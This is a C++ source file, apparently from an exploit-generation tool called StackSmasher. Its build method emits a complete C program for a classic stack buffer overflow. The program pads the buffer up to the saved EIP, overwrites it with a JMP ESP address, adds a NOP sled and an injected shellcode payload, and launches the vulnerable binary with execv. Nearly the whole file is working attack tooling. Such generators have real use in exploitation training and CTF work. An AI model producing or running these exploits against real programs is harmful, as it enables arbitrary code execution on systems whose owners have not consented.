#include "Script/C/C.hpp"

std::string C::getUsage(std::string filename)
{
    return "gcc " + filename + "." + this->getExtension() + " -o " + filename + " && ./" + filename;
}

std::string C::getExtension()
{
    return "c";
}

std::string C::build()
{
    std::string script = "";
    script += "/**\n";
    script += " * Exploit automatically generated by StackSmasher\n";
    script += " * \n";
    script += " * @see https://github.com/McCaulay/StackSmasher\n";
    script += " * @author McCaulay\n";
    script += " */\n";
    script += "\n";
    script += "#include <stdlib.h>\n";
    script += "#include <unistd.h>\n";
    script += "\n";
    script += "int main()\n";
    script += "{\n";
    script += "    // Allocate the data for the exploit payload\n";
    script += "    char* exploit = (char*)malloc(" + std::to_string(this->paddingCount + 4/*EIP*/ + this->nopSledCount + payload.length() + 1/*NULL Terminator*/) + ");\n";
    script += "\n";
    script += "    // Keep a record of the current offset\n";
    script += "    int offset = 0;\n";
    script += "\n";
    script += "    // The vulnerable application binary filename\n";
    script += "    const char* application = \"" + Application::name + "\";\n";
    script += "\n";
    script += "    // The number of bytes until EIP in the buffer\n";
    script += "    int eipOffset = " + std::to_string(this->paddingCount) + ";\n";
    script += "\n";
    script += "    // Padding until EIP\n";
    script += "    for (int i = 0; i < eipOffset; i++, offset++)\n";
    script += "        exploit[offset] = '" + this->getFormattedPaddingCharacter() + "';\n";
    script += "    \n";
    script += "    // JMP ESP at " + this->getEipAddress() + "\n";
    script += "    char eip[4] = \"" + this->getJmpEsp() + "\";\n";
    script += "    for (int i = 0; i < sizeof(eip); i++, offset++)\n";
    script += "        exploit[offset] = eip[i];\n";
    script += "\n";
    if (this->nopSledCount > 0)
    {
        script += "    // NOP Sled of " + std::to_string(this->nopSledCount) + " bytes\n";
        script += "    for (int i = 0; i < " + std::to_string(this->nopSledCount) + "; i++, offset++)\n";
        script += "        exploit[offset] = '\\x90';\n";
        script += "\n";
    }
    script += "    // Payload with " + std::to_string(payload.length()) + " bytes\n";
    script += "    char payload[" + std::to_string(payload.length()) + "] = \"" + this->getFormattedPayload() + "\";\n";
    script += "    for (int i = 0; i < sizeof(payload); i++, offset++)\n";
    script += "        exploit[offset] = payload[i];\n";
    script += "    \n";
    script += "    // NULL Terminator\n";
    script += "    exploit[offset] = '\\0';\n";
    script += "\n";
    script += "    // Setup arguments\n";
    script += "    char* argv[] = { (char*)application, exploit };\n";
    script += "\n";
    script += "    // Execute vulnerable application\n";
    script += "    execv(application, argv);\n";
    script += "\n";
    script += "    // Free allocated memory\n";
    script += "    free(exploit);\n";
    script += "    return 0;\n";
    script += "}\n";

    return script;
}
